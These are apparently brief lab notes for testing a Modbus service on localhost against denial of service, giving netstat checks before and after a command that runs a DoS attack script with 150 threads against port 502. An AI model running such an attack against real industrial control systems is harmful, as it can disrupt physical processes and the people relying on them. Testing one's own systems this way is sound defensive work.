Check before starting dos attack
 netstat -an | findstr :502 | findstr ESTABLISHED
 Should be few only

 Run dos attack
 python src/modbus_dos_attack.py --target 127.0.0.1 --port 502 --attack all --threads 150 --duration 30

 Check again
  netstat -an | findstr :502 | findstr ESTABLISHED
Our modbus, has autoreconnect (protection from this, but it still works)
